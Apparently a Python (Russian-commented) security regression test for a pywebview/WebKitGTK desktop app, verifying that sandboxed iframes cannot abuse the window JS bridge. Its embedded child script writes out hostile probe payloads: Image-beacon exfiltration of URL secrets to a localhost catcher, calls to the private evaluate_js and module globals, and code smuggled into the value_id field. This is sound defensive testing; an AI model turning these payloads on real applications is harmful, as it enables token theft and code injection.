"""Мост окон pywebview — только своей странице (третья и четвёртая рецензии выпуска 5, 05.11). В WebKitGTK (и WKWebView)
window.webkit.messageHandlers.jsBridge есть в каждом фрейме, и во фрейме-песочнице тоже; pywebview искал метод по пути
через точки без запрета «_». Страница-результат задачи (сайт, плагин) звала _studio.evaluate_js(…) и брала ключ студии,
могла открыть ссылку, выйти из программы, взять буфер обмена. Теперь у окна — фасад bridge_api (только JS_API) с ключом
окна (bn= в адресе; assets/dewiar.js подставляет его в каждый вызов), охрана guard_bridge отбрасывает остальное, alert()
фреймов до окна не доходит, а переходы фреймов без нажатия человека — только about:/data:/blob: и страницы программы.

Проверяем в настоящем окне pywebview + WebKitGTK под xvfb: своя страница вызывает метод, фрейм — ничего не может.
Нет WebKitGTK для Python, pywebview или xvfb — проверка пропускается (печатает почему)."""
import json
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(os.environ.get("DEWIAR_ROOT") or Path(__file__).resolve().parent.parent)
fails = []


def ok(c, m):
    print(("✅ " if c else "❌ ") + m)
    if not c:
        fails.append(m)


CHILD = r'''
import json, os, sys, threading, http.server, urllib.parse, time
ROOT, D = sys.argv[1], sys.argv[2]
sys.path.insert(0, os.path.join(ROOT, "ui"))
import app
import webview
got, calls, alerts = [], [], []
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self): got.append(urllib.parse.unquote(self.path)); self.send_response(204); self.end_headers()
    def log_message(self, *a): pass
srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H); port = srv.server_address[1]
threading.Thread(target=srv.serve_forever, daemon=True).start()
steal = "new Image().src='http://127.0.0.1:%d/pwn?'+encodeURIComponent(location.search)" % port
def post(o):
    return "try{window.webkit.messageHandlers.jsBridge.postMessage(JSON.stringify(%s));r.push('posted')}catch(e){r.push('err')}" % json.dumps(o)
probe = "<script>var r=[];" + ";".join([
    post({"funcName": "_studio.evaluate_js", "params": [steal], "id": "1"}),
    post({"funcName": "open_url", "params": ["frame-no-key"], "id": "2"}),
    post({"funcName": "open_url", "params": ["AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "frame-guess"], "id": "3"}),
    post({"funcName": "open_url.__func__.__globals__.clear", "params": [], "id": "4"}),
    post({"funcName": "quit_all", "params": [], "id": "5"}),
    post({"funcName": "_pywebviewAlert", "params": "Введите пароль", "id": "alert"}),
    post({"params": "x" * 300, "funcName": "_pywebviewAlert", "id": "alert"}),
    # четвёртая рецензия: адрес окна через document.baseURI (у srcdoc он — родителя), URL, referrer
    "new Image().src='http://127.0.0.1:%d/leak?'+encodeURIComponent([document.baseURI,document.URL,document.referrer,"
    "(function(){try{return parent.location.href}catch(e){return 'blocked'}})()].join('|'))" % port,
    "var k=(/[?&]bn=([^&#]+)/.exec(document.baseURI)||[])[1]||'none';"
    "window.webkit.messageHandlers.jsBridge.postMessage(JSON.stringify({funcName:'open_url',params:[k,'frame-baseuri'],id:'6'}))",
    # value_id подставляется pywebview в evaluate_js без экранирования — даже с верным ключом такой вызов не проходит
    post({"funcName": "open_url", "params": ["K" * 32, "frame-vid"], "id": 'x"]||1;new Image().src="http://127.0.0.1:%d/MAIN-VID";//' % port}),
    post({"funcName": "open_url", "params": ["K" * 32, "frame-vid2"], "id": 7}),
    post({"funcName": "pywebviewMoveWindow", "params": ["1", "2"], "id": "move"}),
]) + ";setTimeout(function(){location.href='http://127.0.0.1:%d/nav-js?secret'},400);</scr" % port + "ipt>"
refresh = "<meta http-equiv=refresh content='0;url=http://127.0.0.1:%d/nav-refresh?secret'>x" % port
# как настоящие страницы окон: assets/boot.js — первым в <head> (а <base> настоящих страниц проверяется ниже отдельно:
# здесь его нет, чтобы проверить и вторую защиту — адрес окна очищен); после F5 окно работает (ключ — из sessionStorage)
page = """<!doctype html><html><head><script src="%s"></script><meta charset=utf-8></head><body>
<script src="%s"></script>
<script>
var F = %s;
F.forEach(function (h) { var f = document.createElement('iframe'); f.setAttribute('sandbox', 'allow-scripts'); f.srcdoc = h; document.body.appendChild(f); });
window.addEventListener('pywebviewready', function () { setTimeout(function () {
  var n = +(sessionStorage.getItem('n') || 0); sessionStorage.setItem('n', n + 1);
  new Image().src = 'http://127.0.0.1:%d/main-url?' + encodeURIComponent(location.href + '|' + document.baseURI);
  pywebview.api.open_url('main-ok-' + n);
  if (n === 0) setTimeout(function () { location.reload(); }, 700);
}, 300); });
</script></body></html>""" % ("file://" + os.path.join(ROOT, "ui/assets/boot.js"), "file://" + os.path.join(ROOT, "ui/assets/dewiar.js"),
                              json.dumps([probe, refresh]).replace("</", "<\\/"), port)
p = os.path.join(D, "page.html")
open(p, "w", encoding="utf-8").write(page)
class Api:
    def __init__(self): self._studio = None
    def open_url(self, u): calls.append("open_url:" + str(u)); return True
    def quit_all(self): calls.append("quit_all")
    def clip_text(self): calls.append("clip_text"); return "буфер"
api = Api()
url, bridge = app.bridged_url("file://" + p + "?token=SECRET-TOKEN&port=1", "K" * 32), app.bridge_api(api, "K" * 32)
w = webview.create_window("bridge", url, js_api=bridge); api._studio = w
import webview.platforms.gtk as G
G.BrowserView.message_box = lambda self, msg: alerts.append(str(msg)[:40])
app.UI_NAV_OK.append("file://" + D + "/")      # страница проверки — не в папке ui
app.harden_webview("gtk")
def run():
    time.sleep(9)
    print("RESULT " + json.dumps({"got": got, "calls": calls, "alerts": alerts,
                                  "guard": getattr(G.js_bridge_call, "_dewiar", False)}), flush=True)
    os._exit(0)
webview.start(run, gui="gtk")
'''


def find_python():
    """Python с WebKit2 4.1 (gi) и pywebview; pywebview можно взять из другого Python (как в рецензии)."""
    pylib = None
    try:
        import webview  # noqa: F401
        wv = Path(webview.__file__).parent
    except Exception:  # noqa: BLE001
        wv = None
    for py in [sys.executable, "/usr/bin/python3", "/usr/bin/python3.12", "/usr/bin/python3.13"]:
        if not py or not Path(py).exists():
            continue
        probe = "import gi; gi.require_version('Gtk','3.0'); gi.require_version('WebKit2','4.1'); from gi.repository import WebKit2"
        if subprocess.run([py, "-c", probe], capture_output=True).returncode:
            continue
        if subprocess.run([py, "-c", "import webview, bottle, proxy_tools"], capture_output=True).returncode == 0:
            return py, None
        if wv is not None:
            pylib = tempfile.mkdtemp(prefix="dw-pylib-")
            site = wv.parent
            for n in ("webview", "bottle.py", "proxy_tools", "typing_extensions.py"):
                if (site / n).exists():
                    os.symlink(site / n, Path(pylib) / n)
            if subprocess.run([py, "-c", "import webview"], capture_output=True, env={**os.environ, "PYTHONPATH": pylib}).returncode == 0:
                return py, pylib
            shutil.rmtree(pylib, ignore_errors=True)
    return None, None


# 1) без окна: фасад, ключ, охрана
sys.path.insert(0, str(ROOT / "ui"))
os.environ.setdefault("DEWIAR_NO_SINGLE", "1")
try:
    import app as A
except Exception as e:  # noqa: BLE001
    A = None
    print(f"ui/app.py не импортируется здесь ({e}) — проверяю только в окне")
if A is not None:
    class FakeApi:
        _studio = "окно студии"

        def open_url(self, u):
            return "opened " + u
    b = A.bridge_api(FakeApi(), "k" * 32, ("open_url", "quit_all"))
    pub = [n for n in dir(b) if not n.startswith("_")]
    ok(pub == ["open_url"], f"фасад — только методы из списка, которые есть у Api ({pub})")
    ok(not hasattr(b, "_studio") and not hasattr(b, "_api"), "у фасада нет полей Api (_studio, _api)")
    ok(b.open_url("k" * 32, "x") == "opened x", "вызов с ключом окна — работает")
    try:
        b.open_url("bad", "x")
        ok(False, "вызов без ключа отклонён")
    except PermissionError:
        ok(True, "вызов без ключа отклонён (PermissionError)")
    ok(list(b.open_url.__func__.__globals__) == ["__builtins__"], "у метода фасада нет globals модуля (путь через точки — в пустоту)")
    ok(A.bridged_url("file:///x/settings.html?token=t#chat", "N" * 20) == "file:///x/settings.html?token=t&bn=" + "N" * 20 + "#chat",
       "ключ — в адресе до «#раздела»")
    seen = []

    def orig(window, f, p, i):
        seen.append(f)

    class W:
        _js_api = b
    g = A._bridge_guard(orig)
    g(W, "open_url", ["k" * 32, "x"], "1")
    g(W, "open_url", ["x"], "2")
    g(W, "_studio.evaluate_js", ["k" * 32, "x"], "3")
    g(W, "open_url.__func__", ["k" * 32], "4")
    g(W, "pywebviewMoveWindow", [1, 2], "5")
    g(W, "pywebviewStateUpdate", {"key": "a", "value": 1}, "6")

    class W2:
        _js_api = object()
    g(W2, "open_url", ["k" * 32, "x"], "7")
    g(W, "open_url", ["k" * 32, "x"], 'x"]);alert(1);//')
    g(W, "open_url", ["k" * 32, "x"], 5)
    g(W, ["open_url"], ["k" * 32, "x"], "8")
    g(W, "pywebviewMoveWindow", ["1", "2"], "9")
    g(W, "pywebviewAsyncCallback", {"a": 1}, "10")
    ok(seen == ["open_url", "pywebviewMoveWindow"], f"охрана пропускает только метод из списка с ключом и служебное перемещение окна ({seen})")
    ok(A.ui_path_ok("about:srcdoc") and A.ui_path_ok("data:text/html,x") and A.ui_path_ok((ROOT / "ui/settings.html").as_uri())
       and not A.ui_path_ok("http://127.0.0.1:1/x") and not A.ui_path_ok("file:///etc/passwd")
       and not A.ui_path_ok((ROOT / "ui/../core/settings.py").as_uri()), "переходы фреймов: только about:/data:/blob: и папка ui")
    src = (ROOT / "ui/app.py").read_text(encoding="utf-8") + (ROOT / "ui/macui.py").read_text(encoding="utf-8")
    import re
    apis = re.findall(r"js_api=([A-Za-z_]+)", src)
    ok(apis and set(apis) == {"bridge"}, f"все окна — с фасадом моста (js_api=bridge): {sorted(set(apis))}")
    ok(src.count('harden_webview("') >= 3, "охрана ставится перед webview.start (Linux, Windows, Mac)")
    # каждый метод, который зовут страницы, — в списке (иначе кнопка молча перестанет работать)
    js = ""
    for f in list((ROOT / "ui").glob("*.html")) + list((ROOT / "ui").glob("*.js")) + list((ROOT / "ui/studio").glob("*.js")) \
            + list((ROOT / "ui/assets").glob("*.js")):
        js += f.read_text(encoding="utf-8", errors="ignore")
    api_methods = {n for n in dir(A.Api) if not n.startswith("_") and callable(getattr(A.Api, n))}
    used = {n for n in api_methods if re.search(r"(?:\b(?:a|api\(\)|pywebview\.api)\??\.)" + n + r"\b|call\(\"" + n + r"\"\)", js)}
    missing = sorted(used - set(A.JS_API))
    ok(not missing, f"все методы окна, которые зовут страницы, — в JS_API ({missing})")
    ok(all(n in api_methods for n in A.JS_API), f"в JS_API нет несуществующих методов ({sorted(set(A.JS_API) - api_methods)})")
    for page in ("settings.html", "hud.html", "pad.html", "alarm.html", "capture.html", "snip.html", "prompter.html", "call.html"):
        t = (ROOT / "ui" / page).read_text(encoding="utf-8")
        head = t[t.index("<head>") + 6:].lstrip()
        ok(head.startswith(f'<base href="{page}"><script src="assets/boot.js"></script>') and "assets/dewiar.js" in t,
           f"{page}: первым в <head> — <base href=\"{page}\"> и assets/boot.js (фреймы не видят адреса окна), потом dewiar.js")
    used = [f for f in list((ROOT / "ui").glob("*.html")) + list((ROOT / "ui/studio").glob("*.js")) + list((ROOT / "ui").glob("*.js"))
            if "location.search" in f.read_text(encoding="utf-8")]
    ok(not used, f"параметры адреса страницы читают через dwQuery() (адрес окна очищен): {[f.name for f in used]}")

# 2) настоящее окно pywebview + WebKitGTK
py, pylib = find_python()
xvfb = shutil.which("xvfb-run")
if not py:
    print("⏭  WebKitGTK для Python или pywebview нет — проверка в окне пропущена")
elif not os.environ.get("DISPLAY") and not xvfb:
    print("⏭  нет экрана и xvfb-run — проверка в окне пропущена")
else:
    d = tempfile.mkdtemp(prefix="dw-bridge-")
    (Path(d) / "child.py").write_text(CHILD, encoding="utf-8")
    env = {**os.environ, "NO_AT_BRIDGE": "1"}
    if pylib:
        env["PYTHONPATH"] = pylib
    cmd = [py, "-u", str(Path(d) / "child.py"), str(ROOT), d]
    if not os.environ.get("DISPLAY"):
        cmd = [xvfb, "-a"] + cmd
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=90, env=env)
        out = r.stdout + r.stderr
    except subprocess.TimeoutExpired as e:
        out = (e.stdout or b"").decode() if isinstance(e.stdout, bytes) else (e.stdout or "")
    line = next((x for x in out.splitlines() if x.startswith("RESULT ")), "")
    if not line:
        ok(False, "окно pywebview дало результат: " + out[-800:])
    else:
        res = json.loads(line[7:])
        ok(res["guard"], "охрана стоит в модуле платформы GTK")
        ok("open_url:main-ok-0" in res["calls"], f"своя страница зовёт метод окна как раньше (pywebview.api.open_url): {res['calls']}")
        ok("open_url:main-ok-1" in res["calls"], f"после перезагрузки окна (F5) мост работает — ключ из sessionStorage окна: {res['calls']}")
        bad = [c for c in res["calls"] if not c.startswith("open_url:main-ok-")]
        ok(not bad, f"фрейм-песочница не вызвал ни одного метода окна ({bad})")
        ok(not any("pwn" in g for g in res["got"]), f"фрейм не дотянулся до _studio.evaluate_js (ключ студии не ушёл): {res['got']}")
        ok(not any("nav-" in g for g in res["got"]), f"фрейм не увёл себя на http:// без нажатия (location и meta refresh): {res['got']}")
        leak = [g for g in res["got"] if g.startswith("/leak")]
        ok(leak and not any("SECRET-TOKEN" in g or "K" * 32 in g or "bn=" in g for g in leak),
           f"фрейм не видит адреса окна: ни document.baseURI, ни URL, ни referrer — без ключа ядра и ключа моста ({leak[:2]})")
        ok(not any("MAIN-VID" in g for g in res["got"]), "value_id с кодом не исполнился в главной странице (поле — строго [\\w.-]{1,64})")
        mu = [g for g in res["got"] if g.startswith("/main-url")]
        ok(len(mu) >= 2 and not any("SECRET-TOKEN" in g or "bn=" in g for g in mu),
           f"адрес самой страницы окна — без ключей (history.replaceState в assets/boot.js), и после F5 тоже: {mu[:2]}")
        ok(not res["alerts"], f"alert() фрейма не показан окном ({res['alerts']})")
    shutil.rmtree(d, ignore_errors=True)
if pylib:
    shutil.rmtree(pylib, ignore_errors=True)

print("ИТОГ:", "всё прошло" if not fails else f"провалов {len(fails)}")
sys.exit(1 if fails else 0)
